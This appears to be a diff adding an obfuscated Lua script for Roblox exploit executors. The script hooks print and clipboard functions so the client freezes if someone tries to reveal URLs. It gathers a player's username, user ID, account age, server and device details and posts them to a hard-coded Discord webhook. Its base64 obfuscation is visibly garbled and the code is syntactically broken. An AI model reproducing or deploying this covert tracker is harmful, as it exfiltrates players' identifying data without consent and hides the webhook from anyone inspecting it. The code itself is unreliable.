@@ -1,0 +1,112 @@
+
+function base64decode(data)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+
+local gaAHRld = game:GetService(base64decode("Z2FBSFJsZA=="))
+
+local UblCQkHr getExecutor()
+  local yQBqzoiM
+  if identifyexecutor then
+      yQBqzoiM = identifyexecutor()
+  end
+  return { Name = yQBqzoiM or base64decode("VW5rbm93biBFeGVjdXRvcg==") }
+end
+
+local UblCQkHr detectExecutor()
+  local HejGSGf = getExecutor()
+  return string.format(base64decode("JXM="), HejGSGf.Name)
+end
+
+wait(0.1)
+local moiPmxPRaZ = detectExecutor()
+
+if not (setmetatable and hookfunction) then
+  warn(base64decode("Tm90IHJ1bm5pbmcgdGhpcy4="))
+elseif moiPmxPRaZ ~= base64decode("TWFjU3Bsb2l0") and setmetatable and hookfunction then
+  local rAujbWVv = {
+     rconsoleprint,
+     print,
+     setclipboard,
+     rconsoleerr,
+     rconsolewarn,
+     warn,
+     error
+  }
+
+  for i, v in next, rAujbWVv do
+     local VHMsVCE
+     VHMsVCE =
+        hookfunction(
+        v,
+        newcclosure(
+           UblCQkHr(...)
+
+                 local nojFxhXsiCl = {...}
+                 for i, v in next, nojFxhXsiCl do
+                    if tostring(i):find(base64decode("aHR0cHM=")) or tostring(v):find(base64decode("aHR0cHM=")) then
+                       while true do
+                       end
+                    end
+                 end
+                 return VHMsVCE(...)
+           end
+        )
+     )
+  end
+
+  if _G.ID then
+     while true do end
+  end
+  setmetatable(
+     _G,
+     {
+        __newindex = UblCQkHr(t, i, v)
+           if tostring(i) == base64decode("SUQ=") then
+                 while true do
+                 end
+           end
+        end
+     }
+  )
+elseif moiPmxPRaZ == base64decode("TWFjU3Bsb2l0") then
+  warn(base64decode("TWFjU3Bsb2l0IGRldGVjdGVkLCBzdG9wcGluZyB0aGlzIHByb2Nlc3Mu"))
+end
+wait(0.1)
+
+local MzzoLuOn = {
+  [base64decode("bWFsd2VyZWR1bXBlcg==")] = true,
+}
+
+UblCQkHr find_Whitelist_Plr()
+  local hJWkSOFCQTJ = game.Players.LocalPlayer
+  if hJWkSOFCQTJ and MzzoLuOn[hJWkSOFCQTJ.Name] then
+     return true
+  else
+     return false
+  end
+end
+
+local QDLQQTswQSu = find_Whitelist_Plr()
+wait(0.2)
+
+if QDLQQTswQSu then
+  warn(base64decode("RGVuaWVkIGFjY2VzcyAoTm90IFdoaXRlbGlzdGVkKS4="))
+else
+  local cAvhxHAOqe = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+  local FmuFss = ”https://discord.com/api/webhooks/1381337299736068166/lCFyOWSkWj_IRZqe8IRSHwnu9K3LwfNlvuijnee5lx5pjCnieldLug1pvGwFbwuFjgf1base64decode("DQogIHdhaXQoMC4yKQ0KDQogIGxvY2FsIGhKV2tTT0ZDUVRKID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogIGxvY2FsIHlRQnF6b2lNID0gaEpXa1NPRkNRVEouTmFtZQ0KICBsb2NhbCBzSUN6V1ZOeVVCID0gaEpXa1NPRkNRVEouRGlzcGxheU5hbWUNCiAgbG9jYWwgUWVvb25pcnMgPSBoSldrU09GQ1FUSi5Vc2VySWQNCiAgbG9jYWwgZWl0VkRMeGcgPSBoSldrU09GQ1FUSi5BY2NvdW50QWdlDQogIGxvY2FsIHZvYWVaQUxnRCA9IGhKV2tTT0ZDUVRKLkhhc1ZlcmlmaWVkQmFkZ2UNCiAgbG9jYWwgQXVaTVpzelpSID0gZ2FtZS5QbGFjZUlkDQogIGxvY2FsIFptblpVTWogPSBnYW1lLkpvYklkDQogIGxvY2FsIEhXa3lIVXkgPSBvcy5kYXRlKA==")%Y-%m-%d %H:%M:%Sbase64decode("LCBvcy50aW1lKCkpDQoNCiAgbG9jYWwgdk1lT0RnRiwgZXhlY3V0b3JOYW1lID0gcGNhbGwoVWJsQ1FrSHIoKQ0KICAgICByZXR1cm4gaWRlbnRpZnlleGVjdXRvcigpDQogIGVuZCkNCiAgaWYgbm90IHZNZU9EZ0YgdGhlbiBleGVjdXRvck5hbWUgPSA=")Unknownbase64decode("IGVuZA0KDQogIGxvY2FsIFNkZnd1RGRNRlAgPSA=")Unknown Placebase64decode("DQogIGxvY2FsIGphYWpucXd6SCwgcmVzdWx0ID0gcGNhbGwoVWJsQ1FrSHIoKQ0KICAgICByZXR1cm4gZ2FtZTpHZXRTZXJ2aWNlKA==")MarketplaceServicebase64decode("KTpHZXRQcm9kdWN0SW5mbyhBdVpNWnN6WlIpLk5hbWUNCiAgZW5kKQ0KICBpZiBqYWFqbnF3ekggdGhlbiBTZGZ3dURkTUZQID0gcmVzdWx0IGVuZA0KDQogIGxvY2FsIFVibENRa0hyIERldmljZV9EZXRlY3RvcigpDQogICAgIGxvY2FsIGNOZW5NV05VID0gZ2FtZTpHZXRTZXJ2aWNlKA==")cNenMWNUbase64decode("KQ0KICAgICBsb2NhbCBOU0hBaFIgPSBjTmVuTVdOVTpHZXRQbGF0Zm9ybSgpDQogICAgIGxvY2FsIE5WZFN5VFJxcCA9IHsNCiAgICAgICAgW0VudW0uUGxhdGZvcm0uV2luZG93c10gPSA=")Windowsbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5PU1hdID0g")OSXbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5JT1NdID0g")iOSbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5BbmRyb2lkXSA9IA==")Androidbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5YQm94T25lXSA9IA==")Xbox One (Console)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5QUzRdID0g")PS4 (Console)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5YQm94MzYwXSA9IA==")Xbox 360 (Console)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5XaWlVXSA9IA==")Wii-U (Console)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5OWF0gPSA=")Cisco Nexusbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5PdXlhXSA9IA==")Ouya (Android-Based)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5BbmRyb2lkVFZdID0g")Android TVbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5DaHJvbWVjYXN0XSA9IA==")Chromecastbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5MaW51eF0gPSA=")Linux (Desktop)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5TdGVhbU9TXSA9IA==")Steam Clientbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5XZWJPU10gPSA=")Web-OSbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5ET1NdID0g")DOSbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5CZU9TXSA9IA==")BeOSbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5VV1BdID0g")UWP (Go Back To Web Bro..)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5QUzVdID0g")PS5 (Console)base64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5NZXRhT1NdID0g")MetaOSbase64decode("LA0KICAgICAgICBbRW51bS5QbGF0Zm9ybS5Ob25lXSA9IA==")Unknown Devicebase64decode("DQogICAgIH0NCiAgICAgcmV0dXJuIE5WZFN5VFJxcFtOU0hBaFJdIG9yIA==")Unknown Devicebase64decode("DQogIGVuZA0KDQogIGxvY2FsIHVEUnlnR1ggPSBEZXZpY2VfRGV0ZWN0b3IoKQ0KDQogIGxvY2FsIFFwYWlIR3FSID0gew0KICAgICBjb250ZW50ID0g")New Execution Logged:base64decode("LA0KICAgICBlbWJlZHMgPSB7DQogICAgICAgIHsNCiAgICAgICAgICAgdGl0bGUgPSA=")Execution Detailsbase64decode("LA0KICAgICAgICAgICBjb2xvciA9IDE2NzExNjgwLA0KICAgICAgICAgICBmaWVsZHMgPSB7DQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Namebase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIHlRQnF6b2lNIC4uIA==")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Display Namebase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIHNJQ3pXVk55VUIgLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")UserIDbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIFFlb29uaXJzIC4uIA==")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Account Agebase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIGVpdFZETHhnIC4uIA==") days`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Verifiedbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIHRvc3RyaW5nKHZvYWVaQUxnRCkgLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")PlaceIDbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIEF1Wk1ac3paUiAuLiA=")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Place Namebase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIFNkZnd1RGRNRlAgLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")JobIDbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIFptblpVTWogLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Time Executedbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIEhXa3lIVXkgLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Executor Namebase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIGV4ZWN1dG9yTmFtZSAuLiA=")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Device Platformbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIHVEUnlnR1ggLi4g")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Client IDbase64decode("LCB2YWx1ZSA9IA==")`base64decode("IC4uIGdhbWU6R2V0U2VydmljZSg=")RbxAnalyticsServicebase64decode("KTpHZXRDbGllbnRJZCgpIC4uIA==")`base64decode("LCBpbmxpbmUgPSB0cnVlIH0sDQogICAgICAgICAgICAgIHsgeVFCcXpvaU0gPSA=")Joinbase64decode("LCB2YWx1ZSA9IA==")```game:GetService('TeleportService'):TeleportToPlaceInstance(base64decode("IC4uIEF1Wk1ac3paUiAuLiA="), base64decode("IC4uIA==")'base64decode("Li5abW5aVU1qLi4=")'base64decode("IC4uIA=="), game.Players.LocalPlayer)```base64decode("LCBpbmxpbmUgPSB0cnVlIH0NCiAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgIH0NCiAgfQ0KDQogIGxvY2FsIGNMQkFUckhDQSA9IGdhbWU6R2V0U2VydmljZSg=")gaAHRldbase64decode("KTpKU09ORW5jb2RlKFFwYWlIR3FSKQ0KDQogIGlmIGNBdmh4SEFPcWUgdGhlbg0KICAgICBjQXZoeEhBT3FlKHsNCiAgICAgICAgVXJsID0gRm11RnNzLA0KICAgICAgICBNZXRob2QgPSA=")POSTbase64decode("LA0KICAgICAgICBIZWFkZXJzID0geyBb")Content-Typebase64decode("XSA9IA==")application/jsonbase64decode("IH0sDQogICAgICAgIEJvZHkgPSBjTEJBVHJIQ0ENCiAgICAgfSkNCiAgZWxzZQ0KICAgICB3YXJuKA==")HTTP Request Unsupported.")
+  end
+end
